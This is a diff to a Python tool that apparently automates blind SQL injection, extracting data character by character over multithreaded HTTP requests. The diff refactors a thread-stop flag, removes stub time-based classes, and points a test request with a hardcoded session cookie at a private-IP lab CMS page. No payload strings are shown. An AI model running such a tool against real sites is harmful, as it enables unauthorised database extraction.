@@ -10,7 +10,7 @@ import math
 import concurrent.futures
 from dataclasses import dataclass
 from abc import ABC, abstractmethod
-from pwn import *
+from pwn import log
 
 
 # Ctrl + c
@@ -20,6 +20,9 @@ def ctrlC(sig, frame):
 
 
 signal.signal(signal.SIGINT, ctrlC)
+
+# Global variables
+stop_threads = True
 
 
 # Util Classes
@@ -115,24 +118,7 @@ class ConditionalPayload(Payload):
         return result
 
 
-class TimePayload(Payload):
-
-    def build_payload(
-        self,
-        exploit: str,
-        position: int,
-        character: int,
-        db: DB | None,
-        table: Table | None,
-    ) -> str:
-        result = ""
-        return result
-
-
 class RequestType(ABC):
-
-    def __init__(self):
-        self.stop_threads = True
 
     @abstractmethod
     def build_request(
@@ -189,7 +175,7 @@ class PostRequest(RequestType):
         requests_data: WrapperRequest,
     ) -> WrapperResponse | None:
 
-        if self.stop_threads:
+        if stop_threads:
             return None
 
         response = requests.post(
@@ -236,10 +222,10 @@ class GetRequest(RequestType):
         requests_data: WrapperRequest,
     ) -> WrapperResponse | None:
 
-        if self.stop_threads:
+        if stop_threads:
             return None
 
-        response = requests.get(str(requests_data.data), requests_data.headers)
+        response = requests.get(str(requests_data.data), headers=requests_data.headers)
 
         return WrapperResponse(response, requests_data.character)
 
@@ -274,12 +260,6 @@ class StatusEqualCondition(Condition):
             result = True
 
         return result
-
-
-class TimeCondition(Condition):
-
-    def get_condition(self, response: requests.Response) -> bool:
-        return False
 
 
 # Main Class
@@ -527,12 +507,14 @@ class Extractor:
     ) -> str:
         """Use Multithreads, build the payload and data to send the request"""
 
-        self.method.stop_threads = True
+        global stop_threads
+
+        stop_threads = True
         info = ""
         position = 1
 
-        while self.method.stop_threads:
-            self.method.stop_threads = False
+        while stop_threads:
+            stop_threads = False
 
             requests_data = self.method.build_request(
                 self.data,
@@ -560,13 +542,13 @@ class Extractor:
 
                         if self.condition.get_condition(result.response):
                             self._character_finded = result.character
-                            self.method.stop_threads = True
+                            stop_threads = True
 
-                    if self.method.stop_threads:
+                    if stop_threads:
                         executor.shutdown(wait=False)
                         break
 
-            if self.method.stop_threads:
+            if stop_threads:
                 info += chr(self._character_finded)
                 label_info.status(f"{self._select_color(info_name)}{info}{Color.END}")
 
@@ -709,7 +691,10 @@ def main():
 
 
 def test():
-    response = requests.get("http://192.168.1.103")
+    headers = {"Cookie": "PHPSESSID=tjqhdl7m9qjkvu1nbvkv29pm86"}
+    response = requests.get(
+        "http://192.168.1.103/imfadministrator/cms.php?pagename=home", headers=headers
+    )
     print(response.text)
 
 
